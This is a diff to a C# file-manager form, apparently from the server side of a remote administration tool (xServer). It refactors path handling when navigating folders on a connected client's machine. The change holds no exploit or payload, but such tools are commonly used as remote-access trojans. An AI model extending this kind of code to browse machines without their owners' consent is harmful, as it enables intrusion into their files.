@@ -60,14 +60,14 @@ namespace xServer.Forms
             {
                 if (lstDirectory.SelectedItems.Count != 0)
                 {
-                    if (lstDirectory.SelectedItems[0].Tag.ToString() == "dir" && lstDirectory.SelectedItems[0].SubItems[0].Text == "..")
+                    if (lstDirectory.SelectedItems[0].Tag.ToString() == "dir" && _connectClient.Value != null)
                     {
-                        if (_connectClient.Value != null)
+                        if (lstDirectory.SelectedItems[0].SubItems[0].Text == "..")
                         {
-                            if (!_currentDir.EndsWith(@"\"))
-                                _currentDir = _currentDir + @"\";
-
-                            _currentDir = _currentDir.Remove(_currentDir.Length - 1);
+                            if (_currentDir.EndsWith(@"\"))
+                            {
+                                _currentDir = _currentDir.Remove(_currentDir.Length - 1);
+                            }
 
                             if (_currentDir.Length > 2)
                                 _currentDir = _currentDir.Remove(_currentDir.LastIndexOf(@"\"));
@@ -78,17 +78,14 @@ namespace xServer.Forms
                             new Core.Packets.ServerPackets.Directory(_currentDir).Execute(_connectClient);
                             _connectClient.Value.LastDirectorySeen = false;
                         }
-                    }
-                    else if (lstDirectory.SelectedItems[0].Tag.ToString() == "dir")
-                    {
-                        if (_connectClient.Value != null)
+                        else
                         {
                             if (_connectClient.Value.LastDirectorySeen)
                             {
                                 if (_currentDir.EndsWith(@"\"))
-                                    _currentDir = _currentDir + lstDirectory.SelectedItems[0].SubItems[0].Text;
+                                    _currentDir += lstDirectory.SelectedItems[0].SubItems[0].Text;
                                 else
-                                    _currentDir = _currentDir + @"\" + lstDirectory.SelectedItems[0].SubItems[0].Text;
+                                    _currentDir += @"\" + lstDirectory.SelectedItems[0].SubItems[0].Text;
 
                                 new Core.Packets.ServerPackets.Directory(_currentDir).Execute(_connectClient);
                                 _connectClient.Value.LastDirectorySeen = false;
